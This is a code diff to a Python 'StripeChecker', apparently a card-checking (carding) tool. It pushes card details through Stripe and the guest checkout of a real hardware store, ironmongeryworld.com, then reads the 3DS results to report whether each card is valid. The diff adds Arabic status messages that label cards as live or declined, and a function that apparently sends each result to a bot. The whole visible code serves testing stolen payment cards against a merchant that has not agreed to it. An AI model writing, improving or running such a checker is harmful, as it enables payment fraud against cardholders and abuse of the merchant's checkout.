@@ -101,7 +101,8 @@ class StripeChecker:
             r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             pm = r.json()
             if 'id' not in pm:
-                return 'DECLINED', 'Payment method creation failed'
+                error_msg = pm.get('error', {}).get('message', 'Unknown error')
+                return 'DECLINED', f'❌ فشل إنشاء طريقة الدفع: {error_msg}'
             pm_id = pm['id']
             
             headers = self.headers.copy()
@@ -133,7 +134,8 @@ class StripeChecker:
             r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload)
             res = r.json()
             if 'message' not in res or 'pi_' not in res['message']:
-                return 'DECLINED', 'Payment intent creation failed'
+                error_msg = res.get('message', 'Unknown error')
+                return 'DECLINED', f'❌ فشل إنشاء Payment Intent: {error_msg}'
             client_secret = res['message'].split(': ')[1]
             pi_id = client_secret.split('_secret_')[0]
             
@@ -148,7 +150,14 @@ class StripeChecker:
             pi = r.json()
             
             if 'next_action' not in pi:
-                return 'DECLINED', 'No 3DS action required'
+                # التحقق من الحالة
+                pi_status = pi.get('status', 'unknown')
+                if 'last_payment_error' in pi:
+                    error_info = pi['last_payment_error']
+                    decline_code = error_info.get('decline_code', 'unknown')
+                    error_message = error_info.get('message', 'Unknown error')
+                    return 'DECLINED', f'🚫 البطاقة مرفوضة - {decline_code}: {error_message}'
+                return 'DECLINED', f'❌ لا يوجد 3DS - الحالة: {pi_status}'
             
             source = pi['next_action']['use_stripe_sdk']['three_d_secure_2_source']
             trans_id = pi['next_action']['use_stripe_sdk']['server_transaction_id']
@@ -183,8 +192,19 @@ class StripeChecker:
             
             if 'ares' in auth:
                 status = auth['ares'].get('transStatus', 'UNKNOWN')
+                
+                # رسائل توضيحية لكل حالة
+                status_messages = {
+                    'Y': '✅ تمت المصادقة بنجاح - البطاقة صحيحة',
+                    'N': '❌ فشلت المصادقة - البطاقة مرفوضة من البنك',
+                    'U': '🔴 المصادقة غير متاحة - البنك لا يدعم 3DS',
+                    'A': '🔵 محاولة المصادقة - لم يتم التأكيد الكامل',
+                    'C': '⚠️ مطلوب تحدي - يحتاج تأكيد إضافي',
+                    'R': '🚫 مرفوض من الجهة المصدرة - البنك رفض العملية'
+                }
+                
                 if status == 'R':
-                    return 'DECLINED', 'Rejected by issuer'
+                    return 'DECLINED', status_messages.get(status, f'حالة مجهولة: {status}')
                 
                 if status == 'C' and 'creq' in auth and 'ares' in auth and 'acsURL' in auth['ares']:
                     try:
@@ -232,16 +252,17 @@ class StripeChecker:
                         ]
                         
                         if any(keyword in html_response.lower() for keyword in [k.lower() for k in failure_keywords]):
-                            return 'FAILED_AUTH', 'Authentication failed in challenge'
+                            return 'FAILED_AUTH', '❌ فشلت المصادقة في التحدي - البطاقة مرفوضة'
                         
                     except Exception as e:
                         pass
                 
-                return status, f'3DS Status: {status}'
-            return 'DECLINED', 'Authentication failed'
+                return status, status_messages.get(status, f'حالة: {status}')
+            
+            return 'DECLINED', '❌ فشلت المصادقة - لا توجد استجابة من السيرفر'
             
         except Exception as e:
-            return 'ERROR', str(e)
+            return 'ERROR', f'⚠️ خطأ في الاتصال: {str(e)}'
 
 async def send_result(bot_app, card, status_type, message):
     try:
